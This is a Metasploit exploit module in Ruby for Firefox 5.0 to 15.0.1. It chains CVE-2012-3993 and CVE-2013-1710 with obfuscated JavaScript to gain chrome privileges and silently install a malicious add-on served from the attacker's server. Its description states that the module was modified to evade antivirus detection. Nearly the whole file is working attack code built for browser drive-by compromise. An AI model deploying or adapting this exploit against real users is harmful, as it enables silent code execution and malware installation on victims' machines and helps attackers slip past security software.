##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::BrowserAutopwn
  include Msf::Exploit::Remote::FirefoxAddonGenerator

  autopwn_info({
    :ua_name    => HttpClients::FF,
    :ua_minver  => "5.0",
    :ua_maxver  => "15.0.1",
    :javascript => true,
    :rank       => NormalRanking
  })

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Firefox 5.0 - 15.0.1 __exposedProps__ XCS Code Execution',
      'Description'    => %q{

        Modification to multi/browser/firefox_proto_crmfrequest which evades AV detection
        of attempted OS detection on the part of Metasploit.

        On versions of Firefox from 5.0 to 15.0.1, the InstallTrigger global, when given
        invalid input, would throw an exception that did not have an __exposedProps__
        property set. By re-setting this property on the exception object's prototype,
        the chrome-based defineProperty method is made available.

        With the defineProperty method, functions belonging to window and document can be
        overriden with a function that gets called from chrome-privileged context. From here,
        another vulnerability in the crypto.generateCRMFRequest function is used to "peek"
        into the context's private scope. Since the window does not have a chrome:// URL,
        the insecure parts of Components.classes are not available, so instead the AddonManager
        API is invoked to silently install a malicious plugin.
      },
      'License' => MSF_LICENSE,
      'Author'  => [
        'Mariusz Mlynski', # discovered CVE-2012-3993
        'moz_bug_r_a4', # discovered CVE-2013-1710
        'joev', # metasploit module
        'Aubrey Alston' # Removal of OS detection
      ],
      'DisclosureDate' => "Aug 6 2013",
      'References' => [
        ['CVE', '2012-3993'],  # used to install function that gets called from chrome:// (ff<15)
        ['OSVDB', '86111'],
        ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=768101'],
        ['CVE', '2013-1710'],  # used to peek into privileged caller's closure (ff<23)
        ['OSVDB', '96019']
      ],
      'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                    'DisablePayloadHandler' => 'true',
                    'HTML::base64' => 'random_space_injection'
                }
    ))

    register_options([
      OptString.new('CONTENT', [ false, "Content to display inside the HTML <body>.", '' ] )
    ], self.class)
  end

  def on_request_uri(cli, request)
    if request.uri.match(/\.xpi$/i)
      print_status("Sending the malicious addon")
      send_response(cli, generate_addon_xpi(cli).pack, { 'Content-Type' => 'application/x-xpinstall' })
    else
      print_status("Sending HTML")
      send_response_html(cli, generate_html())
    end
  end

  def generate_html()
    injection = 
      "p2.constructor.defineProperty(obj,key,{get:runme});"

    script = js_obfuscate %Q|
      try{InstallTrigger.install(0)}catch(e){p=e;};
      var p2=Object.getPrototypeOf(Object.getPrototypeOf(p));
      p2.__exposedProps__={
        constructor:'rw',
        prototype:'rw',
        defineProperty:'rw',
        __exposedProps__:'rw'
      };
      var s = document.querySelector('#payload').innerHTML;
      var q = false;
      var register = function(obj,key) {
        var runme = function(){
          if (q) return;
          q = true;
          window.crypto.generateCRMFRequest("CN=Me", "foo", "bar", null, s, 384, null, "rsa-ex");
        };
        try {
          #{injection}
        } catch (e) {}
      };
      for (var i in window) register(window, i);
      for (var i in document) register(document, i);
    |

    js_payload = js_obfuscate %Q|
      if (!window.done) {
        window.AddonManager.getInstallForURL(
          '#{get_module_uri}/addon.xpi',
          function(install) { install.install() },
          'application/x-xpinstall'
        );
        window.done = true;
      }
    |

    %Q|
      <html>
      <body>
      #{datastore['CONTENT']}
      <div id='payload' style='display:none'>
        #{js_payload}
      </div>
      <script>
        #{script}
      </script>
      </body>
      </html>
    |
  end
end
